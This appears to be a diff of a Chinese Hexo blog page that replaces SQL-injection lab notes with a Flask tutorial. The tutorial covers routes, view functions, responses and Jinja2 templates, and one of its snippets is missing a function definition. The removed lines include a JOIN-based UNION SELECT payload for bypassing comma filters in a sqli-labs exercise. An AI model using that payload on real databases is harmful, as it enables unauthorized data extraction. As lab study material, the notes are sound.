+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello/&lt;name&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;hello.html&#x27;</span>, name=name)</span><br></pre></td></tr></table></figure>
+
+<p>渲染html页面</p>
+<p><strong>8.路由优先级</strong></p>
+<p>Flask 按照定义的顺序匹配路由，第一个匹配成功的路由将被处理。确保更具体的路由放在更一般的路由之前。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/user/&lt;int:user_id&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">user_profile</span>(<span class="params">user_id</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&#x27;User ID: <span class="subst">&#123;user_id&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/user&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">user_list</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;User List&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>如果带参数则匹配第一个路由，不带参数则匹配第二个路由</p>
+<h2 id="5-Flask-视图函数"><a href="#5-Flask-视图函数" class="headerlink" title="5.Flask 视图函数"></a>5.Flask 视图函数</h2><p>不知道为什么这个要叫视图函数，我认为和普通的python函数差不多，以前也了解了一些基础知识，所以只学其他的</p>
+<p>视图函数是 Flask 应用中的核心部分，它负责处理请求并生成响应。</p>
+<p>视图函数与路由紧密结合，通过路由将 URL 映射到具体的视图函数。</p>
+<p>以下是对 Flask 视图函数的详细说明，包括如何定义、使用请求数据、返回响应、以及如何处理错误等。</p>
+<ol>
+<li><strong>定义视图函数</strong>：视图函数是处理请求并返回响应的核心功能。</li>
+<li><strong>接收请求数据</strong>：使用 <code>request</code> 对象获取 URL 参数、表单数据、查询参数等。</li>
+<li><strong>返回响应</strong>：可以返回字符串、HTML、JSON 或自定义响应对象。</li>
+<li><strong>处理请求和响应</strong>：使用 <code>request</code> 对象和 <code>make_response</code> 来处理请求和生成自定义响应。</li>
+<li><strong>处理错误</strong>：视图函数内处理异常或使用 Flask 的错误处理机制。</li>
+<li><strong>视图函数的装饰器</strong>：使用 <code>@app.before_request</code>、<code>@app.after_request</code> 等装饰器处理请求前后逻辑。</li>
+<li><strong>视图函数返回的状态码</strong>：可以指定 HTTP 状态码来表示请求的处理结果。</li>
+</ol>
+<p><strong>1.接收请求数据</strong></p>
+<p>视图函数可以接收不同类型的请求数据，包括 URL 参数、表单数据、查询参数等。</p>
+<p>获取 URL 参数：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/greet/&lt;name&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">greet</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&#x27;Hello, <span class="subst">&#123;name&#125;</span>!&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>&lt;name&gt;</code> 是一个 URL 参数，传递到视图函数 <code>greet</code>。</li>
+</ul>
+<p>获取表单数据:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/submit&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">submit</span>():</span><br><span class="line">    username = request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&#x27;Form submitted by <span class="subst">&#123;username&#125;</span>!&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>**request.form.get(‘username’)**：获取 POST 请求中表单数据的 username 字段。和form表单差不多，使用POST请求也可以</p>
+<p>获取查询数据：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/search&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search</span>():</span><br><span class="line">    query = request.args.get(<span class="string">&#x27;query&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&#x27;Search results for: <span class="subst">&#123;query&#125;</span>&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>**request.args.get(‘query’)**：获取 GET 请求中的查询参数 query。这个就是url的GET传参</p>
+<p><strong>2.返回响应</strong></p>
+<p>视图函数可以返回多种类型的响应，包括字符串、HTML、JSON、或自定义响应对象。</p>
+<p>返回字符串：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/message&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">message</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;This is a simple message.&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>返回 HTML 模板：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello/&lt;name&gt;&#x27;</span></span>)</span></span><br><span class="line">render_template(<span class="string">&#x27;hello.html&#x27;</span>, name=name)</span><br><span class="line"><span class="comment">#name=name用于传递参数</span></span><br></pre></td></tr></table></figure>
+
+<p>**render_template(‘hello.html’, name&#x3D;name)**：渲染 HTML 模板 hello.html，并将 name 变量传递给模板。</p>
+<p>返回 JSON 数据：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> jsonify</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api/data&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">api_data</span>():</span><br><span class="line">    data = &#123;<span class="string">&#x27;key&#x27;</span>: <span class="string">&#x27;value&#x27;</span>&#125;</span><br><span class="line">    <span class="keyword">return</span> jsonify(data)</span><br></pre></td></tr></table></figure>
+
+<p>**jsonify(data)**：将 Python 字典转换为 JSON 响应</p>
+<p>返回自定义响应对象</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Response</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/custom&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">custom_response</span>():</span><br><span class="line">    response = Response(<span class="string">&#x27;Custom response with headers&#x27;</span>, status=<span class="number">200</span>)</span><br><span class="line">    response.headers[<span class="string">&#x27;X-Custom-Header&#x27;</span>] = <span class="string">&#x27;Value&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> response</span><br></pre></td></tr></table></figure>
+
+<p>**Response(‘Custom response with headers’, status&#x3D;200)**：创建自定义响应对象，并设置响应头。</p>
+<p><strong>3.处理请求和响应</strong></p>
+<p>视图函数可以访问请求对象，并根据请求数据生成响应。可以使用 request 对象来获取请求的信息，使用 make_response 来创建自定义响应。</p>
+<p>使用 request 对象：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/info&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">info</span>():</span><br><span class="line">    user_agent = request.headers.get(<span class="string">&#x27;User-Agent&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&#x27;Your user agent is <span class="subst">&#123;user_agent&#125;</span>&#x27;</span></span><br><span class="line"><span class="comment">#获取请求头的各种信息</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> make_response</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/header&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">custom_header</span>():</span><br><span class="line">    response = make_response(<span class="string">&#x27;Response with custom header&#x27;</span>)</span><br><span class="line">    response.headers[<span class="string">&#x27;X-Custom-Header&#x27;</span>] = <span class="string">&#x27;Value&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"><span class="comment">#我们通过make_response创建自定义响应</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>4.处理错误</strong></p>
+<p>可以在视图函数中处理异常或错误，或者通过 Flask 提供的错误处理机制来处理应用中的错误。</p>
+<p>在视图函数中处理错误:</p>
+<p>实例:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/divide/&lt;int:x&gt;/&lt;int:y&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">divide</span>(<span class="params">x, y</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = x / y</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;Result: <span class="subst">&#123;result&#125;</span>&#x27;</span></span><br><span class="line">    <span class="keyword">except</span> ZeroDivisionError:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Error: Division by zero&#x27;</span>, <span class="number">400</span></span><br><span class="line"><span class="comment">#使用 try-except 语句处理除零错误，并返回自定义错误消息和状态码。</span></span><br><span class="line"><span class="comment">#全局错误处理:</span></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">not_found</span>(<span class="params">error</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Page not found&#x27;</span>, <span class="number">404</span></span><br><span class="line"><span class="comment">#@app.errorhandler(404)：定义处理 404 错误的函数。</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>5.视图函数的装饰器</strong></p>
+<p>除了 @app.route，Flask 还支持其他装饰器，用于实现更复杂的功能。</p>
+<p>示例：</p>
+<ul>
+<li>**<code>@app.before_request</code>**：在每个请求处理之前运行的函数。</li>
+<li>**<code>@app.after_request</code>**：在每个请求处理之后运行的函数。</li>
+<li>**<code>@app.teardown_request</code>**：在请求结束后运行的函数，用于清理工作。</li>
+</ul>
+<p>示例装饰器使用：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.before_request</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">before_request</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Before request&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.after_request</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">after_request</span>(<span class="params">response</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;After request&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.teardown_request</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">teardown_request</span>(<span class="params">exception</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Teardown request&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><strong>6.视图函数返回的状态码</strong></p>
+<p>视图函数不仅可以返回内容，还可以指定 HTTP 状态码。</p>
 <p>实例：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">join</span> emails <span class="keyword">on</span> users.id<span class="operator">=</span>emails.id;</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/status&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">status</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Everything is OK&#x27;</span>, <span class="number">200</span></span><br><span class="line"><span class="comment">#返回状态码 200 表示请求成功。</span></span><br><span class="line"><span class="comment">#返回带有状态码的响应对象：</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Response</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/error&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">error</span>():</span><br><span class="line">    <span class="keyword">return</span> Response(<span class="string">&#x27;An error occurred&#x27;</span>, status=<span class="number">500</span>)</span><br></pre></td></tr></table></figure>
 
-<img src="/2025/01/12/sql%E6%B3%A8%E5%85%A5/image-20250120114033681.png" class="lazyload" data-srcset="/2025/01/12/sql%E6%B3%A8%E5%85%A5/image-20250120114033681.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250120114033681">
 
-<p>显而易见，这条sql语句根本没有使用’,’也达到了将两张表拼接起来的效果，相应的使用join可以省掉<strong>select 1,2,3</strong>的逗号</p>
-<p>我们可以输入一下语句：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span><span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>)c <span class="keyword">join</span>(<span class="keyword">select</span> <span class="number">2</span>)a <span class="keyword">join</span>(<span class="keyword">select</span> <span class="number">3</span>)b;</span><br><span class="line">#语句未使用逗号，和普通联合查询一样，只需要更改<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>对应内容即可</span><br><span class="line">#还有a,b,c是别称，是必须的</span><br></pre></td></tr></table></figure>
 
-<p>额，不知道为什么，我的靶场好像和别人的不一样，别人都less-25a是会吞掉输入的逗号的，但我的只吞and和or看来只能用数据库做演示了</p>
-<p>上面代码执行的的效果图：</p>
-<img src="/2025/01/12/sql%E6%B3%A8%E5%85%A5/image-20250120120111424.png" class="lazyload" data-srcset="/2025/01/12/sql%E6%B3%A8%E5%85%A5/image-20250120120111424.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250120120111424">
+<h2 id="6-模板渲染"><a href="#6-模板渲染" class="headerlink" title="6.模板渲染"></a>6.模板渲染</h2><p>模板是包含占位符的 HTML 文件。</p>
+<p>Flask 使用 Jinja2 模板引擎来处理模板渲染。模板渲染允许你将动态内容插入到 HTML 页面中，使得应用能够生成动态的网页内容。</p>
+<p>以下是关于 Flask 模板渲染的详细说明，包括如何创建和使用模板、模板继承、控制结构等。</p>
+<ol>
+<li><strong>创建模板</strong>：将 HTML 文件放在 <code>templates</code> 文件夹中，使用 Jinja2 占位符。</li>
+<li><strong>渲染模板</strong>：使用 <code>render_template</code> 函数在视图函数中渲染模板。</li>
+<li><strong>模板继承</strong>：创建基础模板，允许其他模板继承和扩展。</li>
+<li><strong>控制结构</strong>：使用条件语句和循环在模板中控制逻辑。</li>
+<li><strong>过滤器</strong>：使用过滤器格式化变量数据。</li>
+<li><strong>宏和模板包含</strong>：创建和使用宏以及模板包含，提高模板的复用性。</li>
+<li><strong>安全性</strong>：Jinja2 默认对模板变量进行自动转义以防止 XSS 攻击。</li>
+<li><strong>模板上下文</strong>：将数据传递给模板，并在模板中使用这些数据。</li>
+</ol>
+<p><strong>基本概念</strong></p>
+<p>模板是包含占位符的 HTML 文件。</p>
+<p>Flask 使用 Jinja2 模板引擎来渲染这些模板，将 Python 数据插入到 HTML 中，从而生成最终的网页。</p>
+<h3 id="1-创建模板"><a href="#1-创建模板" class="headerlink" title="1.创建模板"></a>1.创建模板</h3><p>模板文件通常放在项目的 templates 文件夹中。</p>
+<p>Flask 会自动从这个文件夹中查找模板文件。</p>
+<p><strong>创建模板文件</strong>：在项目目录下创建 templates 文件夹，并在其中创建一个 HTML 文件，如 index.html。</p>
+<p>templates&#x2F;index.html 文件代码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Welcome<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;&#123; title &#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Hello, &#123;&#123; name &#125;&#125;!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>&#123;&#123; title &#125;&#125;</code> 和 <code>&#123;&#123; name &#125;&#125;</code> 是模板占位符，将在渲染时被替换成实际的值。</p>
+<p>在视图函数中渲染模板：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, title=<span class="string">&#x27;Welcome Page&#x27;</span>, name=<span class="string">&#x27;John Doe&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+
+<p>r**ender_template(‘index.html’, title&#x3D;’Welcome Page’, name&#x3D;’John Doe’)**：渲染 index.html 模板，并将 title 和 name 变量传递给模板。</p>
+<h3 id="2-模板继承"><a href="#2-模板继承" class="headerlink" title="2.模板继承"></a>2.模板继承</h3><p>模板继承允许你创建一个基础模板，然后在其他模板中继承和扩展这个基础模板，避免重复的 HTML 代码。</p>
+<p><strong>创建基础模板</strong>：在 templates 文件夹中创建一个基础模板 base.html。</p>
+<p>templates&#x2F;base.html 示例：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>&#123;% block title %&#125;My Website&#123;% endblock %&#125;<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">header</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>My Website<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">header</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">main</span>&gt;</span></span><br><span class="line">        &#123;% block content %&#125;&#123;% endblock %&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">main</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">footer</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>Footer content<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">footer</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>&#123;% block title %&#125;&#123;% endblock %&#125;</code> 和 <code>&#123;% block content %&#125;&#123;% endblock %&#125;</code> 是定义的<strong>可替换区域</strong>。</p>
+<p><strong>创建子模板</strong>：在 templates 文件夹中创建一个子模板 index.html，继承 base.html。</p>
+<p>templates&#x2F;index.html 文件代码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;% block title %&#125;Home Page&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block content %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>Welcome to the Home Page!<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Content goes here.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>&#123;% extends "base.html" %&#125;</code>：继承基础模板。</p>
+<p>&#96;</p>
 
   </div>
   
@@ -2911,10 +2869,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateModified" datetime="2025-03-15T16:34:49+08:00">
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2025-03-25T15:06:22+08:00">
   <a class='notlink'>
     <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：Mar 15, 2025</p>
+    <p>更新于：Mar 25, 2025</p>
   </a>
 </div>
 
@@ -2933,7 +2891,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2025/01/12/sql%E6%B3%A8%E5%85%A5/&title=sql注入 - Hexo&summary="
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2025/03/16/Flask/&title=Flask - Hexo&summary="
           
           >
           
@@ -2945,7 +2903,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2025/01/12/sql%E6%B3%A8%E5%85%A5/&title=sql注入 - Hexo&summary="
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2025/03/16/Flask/&title=Flask - Hexo&summary="
           
           >
           
@@ -2957,7 +2915,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2025/01/12/sql%E6%B3%A8%E5%85%A5/&title=sql注入 - Hexo&summary="
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2025/03/16/Flask/&title=Flask - Hexo&summary="
           
           >
           
@@ -2990,21 +2948,16 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
     <div class="prev-next">
       
-        <a class='prev' href='/2025/01/15/Buuctf/'>
-          <p class='title'><i class="fa-solid fa-chevron-left" aria-hidden="true"></i>Buuctf</p>
-          <p class='content'>buuctf笔记前言此笔记用于记录在buuctf web上做题的笔记与题解
-1.[极客大挑战 2019]EasySQL第一题当然是最简单的，一个普通的万能密码即可
-
-
-此关必须输入用户名和密码，...</p>
+        <a class='prev' href='/2025/03/17/SSRF/'>
+          <p class='title'><i class="fa-solid fa-chevron-left" aria-hidden="true"></i>SSRF</p>
+          <p class='content'>SSRF漏洞笔记前言虽然现在可以在buu上一直做题了，但还是需要学一些新的东西，还有就是要跟上其他人的进度，我可不想被优化
+1.SSRF漏洞简介SSRF(Server-Side Request ...</p>
         </a>
       
       
-        <a class='next' href='/2025/01/03/MySQL/'>
-          <p class='title'>MySQL<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
-          <p class='content'>MySQL笔记1.MySQL简介数据库（Database）是按照数据结构来组织、存储和管理数据的仓库。
-每个数据库都有一个或多个不同的 API 用于创建，访问，管理，搜索和复制所保存的数据。
-我...</p>
+        <a class='next' href='/2025/03/14/%E7%88%86%E7%A0%B4/'>
+          <p class='title'>爆破<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'></p>
         </a>
       
     </div>
@@ -3020,7 +2973,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   <article class="post white-box shadow floatable blur" id="comments">
     <span hidden>
-      <meta itemprop="discussionUrl" content="/2025/01/12/sql%E6%B3%A8%E5%85%A5/index.html#comments">
+      <meta itemprop="discussionUrl" content="/2025/03/16/Flask/index.html#comments">
     </span>
     <p ct><i class='fa-solid fa-comments'></i> 评论</p>
     
